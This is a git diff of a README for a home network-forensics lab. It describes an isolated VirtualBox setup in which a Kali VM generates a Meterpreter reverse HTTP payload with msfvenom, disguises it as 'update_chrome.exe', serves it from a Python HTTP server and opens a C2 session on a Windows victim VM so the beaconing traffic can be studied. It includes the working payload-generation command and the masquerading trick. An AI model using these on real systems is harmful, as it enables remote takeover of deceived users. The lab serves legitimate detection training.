@@ -12,20 +12,19 @@ This lab demonstrates proficiency in Network Forensics, specifically:
 * Identification of periodic communication patterns (Beaconing).
 
 ## Lab Architecture & Specifications
-The environment was hosted on a Type 2 Hypervisor (VirtualBox) with a dedicated NAT Network (10.0.10.0/24) to simulate an isolated compromise scenario[cite: 12].
+The environment was hosted on a Type 2 Hypervisor (VirtualBox) with a dedicated NAT Network (10.0.10.0/24) to simulate an isolated compromise scenario.
 
 ### Host Machine
-* **Processor:** AMD Ryzen 9 5900HX (3.30 GHz) [cite: 14]
-* **RAM:** 32 GB [cite: 15]
-* **OS:** Windows 11 Pro [cite: 16]
+* **Processor:** AMD Ryzen 9 5900HX (3.30 GHz)
+* **RAM:** 32 GB
 
 ### Virtual Machines
 | Role | OS | Resources | Function |
 | :--- | :--- | :--- | :--- |
-| **Attacker** | Kali Linux (Rolling 2025.2) | 4 vCPU, 4 GB RAM | C2 Server (Metasploit), Payload Generation, Handler [cite: 18] |
-| **Victim** | Windows 10 Pro | 2 vCPU, 4 GB RAM | Target workstation, infected with Reverse HTTP payload [cite: 18] |
+| **Attacker** | Kali Linux (Rolling 2025.2) | 4 vCPU, 4 GB RAM | C2 Server (Metasploit), Payload Generation, Handler |
+| **Victim** | Windows 10 Pro | 2 vCPU, 4 GB RAM | Target workstation, infected with Reverse HTTP payload |
 
-**Network Configuration:** A "Homelab" NAT Network allows strict isolation while enabling C2 communication between `10.0.10.3` (Attacker) and `10.0.10.4` (Victim)[cite: 19].
+**Network Configuration:** A "Homelab" NAT Network allows strict isolation while enabling C2 communication between `10.0.10.3` (Attacker) and `10.0.10.4` (Victim).
 
 ---
 
@@ -35,16 +34,16 @@ I utilized `msfvenom` to generate a **stageless** reverse HTTP payload. This pay
 * **Payload:** `windows/x64/meterpreter_reverse_http`
 * **Masquerading:** The artifact was named `update_chrome.exe` to simulate a legitimate browser update.
 
-(da usare bash markdown)
+```bash
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.0.10.3 LPORT=8080 -f exe -o update_chrome.exe
-(chiudi bash markdown)
+```
 
 ### 2. Delivery Mechanism
 To simulate the payload delivery, I spun up a temporary Python HTTP server on port 8000, allowing the victim machine to download the malicious binary.
 
-(da usare bash markdown)
+```bash
 python3 -m http.server 8000
-(chiudi bash markdown)
+```
 
 *[INSERT IMAGE: 2-python_server_downloading_malware.png]*
 
@@ -66,11 +65,6 @@ Upon execution of `update_chrome.exe` on the victim machine, a Meterpreter sessi
 
 ### 3. Modifying Beaconing Interval
 To generate specific traffic artifacts, I issued the `sleep 5` command within the Meterpreter session. This instructed the malware to check in (beacon) with the C2 server exactly every 5 seconds.
-
-(da usare bash markdown)
-meterpreter > sleep 5
-[*] Telling the target instance to sleep for 5 seconds ...
-(chiudi bash markdown)
 
 *[INSERT IMAGE: 5.sleep_malware.png]*
 
